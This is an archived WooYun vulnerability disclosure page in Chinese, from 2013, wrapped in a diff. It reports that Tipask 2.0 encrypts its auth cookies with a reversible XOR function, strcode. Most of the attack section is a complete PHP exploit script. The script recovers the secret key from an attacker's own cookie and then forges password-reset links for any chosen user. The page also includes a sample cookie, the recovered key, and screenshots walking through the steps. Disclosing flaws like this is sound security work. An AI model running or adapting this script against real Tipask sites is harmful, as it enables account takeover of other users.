@@ -1,0 +1,272 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Tipask 2.0 加密函数破解导致任意用户密码修改  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Tipask 2.0 加密函数破解导致任意用户密码修改  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-06-24 16:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-24：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-09-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Tipask问答系统是一款开放源码的PHP仿百度知道程序。以国人的使用习惯为设计理念，采用MVC构架，系统具有速度快，SEO友好，界面操作简洁明快等特点。<br />
+     但是Tipask中使用的加密算法存在被破解的可能性，因此将导致包括任意用户密码修改等漏洞的发生。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在核心加密算法strcode函数中：<br />
+<br />
+</p><pre><code>/* 通用加密解密函数，phpwind、phpcms、dedecms都用此函数 */<br />
+function strcode($string, $auth_key, $action= &#039;ENCODE&#039;) {<br />
+    $key = substr(md5($_SERVER[ &quot;HTTP_USER_AGENT&quot;] . $auth_key), 8, 18);<br />
+    $string = $action == &#039;ENCODE&#039; ? $string : base64_decode($string);<br />
+    $len = strlen($key);<br />
+    $code = &#039;&#039;;<br />
+    for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+        $k = $i % $len;<br />
+        $code .= $string[$i] ^ $key[$k];<br />
+    }<br />
+    $code = $action == &#039;DECODE&#039; ? $code : base64_encode($code);<br />
+    return $code;<br />
+}</code></pre><p class='detail'><br />
+<br />
+可以看到加密的算法是异或，所以可以用密文和明文异或的方法反过来求出密钥key，如下：<br />
+<br />
+</p><pre><code>function anti_strcode($authstr, $plaintxt)<br />
+{<br />
+      $key =&#039;&#039;;<br />
+      $authstr = urldecode(base64_decode($authstr));     <br />
+      for($i = 0; $i &lt; 18; $i++)<br />
+      {<br />
+            $key .= $authstr[$i] ^ $plaintxt[$i];<br />
+      }<br />
+      <br />
+      return $key;<br />
+}</code></pre><p class='detail'><br />
+<br />
+key长度为18，因此我们要找一个明文长度超过18而被加密的字串，经过检查，发现cookie中的auth值长度超过了18，因此将针对cookie中的auth进行key猜解。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在Tipask的密码重置中，生成密码重置链接的关键字串是由strcode产生，因此可以利用破解后的key来达到任意密码修改功能。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+printf(&quot;-------------------------------------------------------<br />
+Tipask 2.0 authkey decrypt exploit<br />
+Author:ztz<br />
+Blog:http://ztz.fuzzexp.org/<br />
+-------------------------------------------------------\n\n&quot; );<br />
+<br />
+if ($argc &lt; 3) {<br />
+      print_r( &quot;Usage:         php exp.php uid password auth_cookie\nexample:   php exp.php 1 s3cr4t AjAGAAcFVwcHBwYHUA8GU19UBwtTV1AGAQQMUgMEWwpSVg%3D%3D\n\n&quot;);<br />
+       exit();<br />
+}<br />
+<br />
+$uid = $argv[1];<br />
+$password = md5($argv[2]);<br />
+$auth_cookie = $argv[3];<br />
+<br />
+$str = &quot;$uid \t$password &quot;;<br />
+<br />
+$key = anti_strcode(&quot;$auth_cookie &quot;, &quot; $str&quot;);<br />
+<br />
+print &quot;[+]Key: $key \n&quot;;<br />
+print &quot;[*]Input the username you want to reset: &quot;;<br />
+fscanf(STDIN, &quot;%s\n&quot;, $username);<br />
+<br />
+print &quot;[*]Encrypting...\n&quot;;<br />
+$code = urlencode(strcode($username, $key));<br />
+print &quot;[+]Reset password here: ?user/resetpass/$code \n&quot;;<br />
+<br />
+//function<br />
+function anti_strcode($authstr, $plaintxt)<br />
+{<br />
+      $key = &#039;&#039;;<br />
+      $authstr = urldecode(base64_decode($authstr));<br />
+            <br />
+       for($i = 0; $i &lt; 18; $i++)<br />
+      {<br />
+            $key .= $authstr[$i] ^ $plaintxt[$i];<br />
+      }<br />
+       return $key;<br />
+}<br />
+<br />
+function strcode($string, $key) {<br />
+    $len = 18;<br />
+    $code = &#039;&#039;;<br />
+    for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+        $k = $i % $len;<br />
+        $code .= $string[$i] ^ $key[$k];<br />
+    }<br />
+    $code = base64_encode($code);<br />
+    return $code;<br />
+}<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+首先申请重置目标用户的密码<br />
+<br />
+</p><p class="detail"><a href="../images/24153502edb786a6263278bad3b9e91d6a7146d8.png" target="_blank"><img src="../images/24153502edb786a6263278bad3b9e91d6a7146d8.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+利用自己的注册用户的cookie解密key：<br />
+<br />
+</p><p class="detail"><a href="../images/241535296e7d374c50ca119164ca0255e1ceded6.png" target="_blank"><img src="../images/241535296e7d374c50ca119164ca0255e1ceded6.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+当前登录用户cookie中的auth为VjEFWAFbAwtXBlUDV1ZVCAEAUFkDBQFcVFcCUggCAlNVWg%3D%3D<br />
+<br />
+然后进行解密：<br />
+<br />
+</p><p class="detail"><a href="../images/24153559c7915082ceba061027ccc00d81d1861f.png" target="_blank"><img src="../images/24153559c7915082ceba061027ccc00d81d1861f.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+获得key为d82ab802de152bf9bb<br />
+<br />
+然后输入想要重置的用户：<br />
+<br />
+</p><p class="detail"><a href="../images/24153629e2c92cbd666f5135e78e0844c83a6e32.png" target="_blank"><img src="../images/24153629e2c92cbd666f5135e78e0844c83a6e32.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+获得了重置密码的链接。<br />
+<br />
+</p><p class="detail"><a href="../images/241536598e8b0e699876842940d605ed88e60b7a.png" target="_blank"><img src="../images/241536598e8b0e699876842940d605ed88e60b7a.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/24153709630329e8b54f55d138c106e207d92b7d.png" target="_blank"><img src="../images/24153709630329e8b54f55d138c106e207d92b7d.png" alt="7.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">估计厂商不会来认领，so </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026780" title="Tipask 2.0 加密函数破解导致任意用户密码修改">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26780";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
